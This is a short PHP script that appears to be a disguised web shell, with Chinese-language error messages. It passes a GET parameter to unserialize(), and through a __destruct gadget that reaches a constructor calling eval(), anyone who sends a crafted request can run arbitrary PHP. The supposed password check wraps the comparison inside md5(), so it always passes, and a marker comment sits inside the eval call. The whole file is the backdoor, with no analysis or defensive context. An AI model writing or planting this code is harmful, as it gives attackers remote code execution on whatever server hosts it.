<?php

class abc {
    public $aaa = null;
    public $bbb = null;
    function __destruct(){
        new $this->aaa($this->bbb);
    }
}
class def {
    function __construct($haha){
        if (md5($_GET['pass'] === '1a1dc91c907325c69271ddf0c944bc72')){
            eval('/*5shgSG6*/'.$haha);
        }else{
            exit('pass错误。');
        }
    }
}
function main(){
    if(isset($_GET['o'])){
        $qc = $_GET['o'];
    }else{
        exit('参数错误！');
    }
    unserialize($qc);
}

main();

?>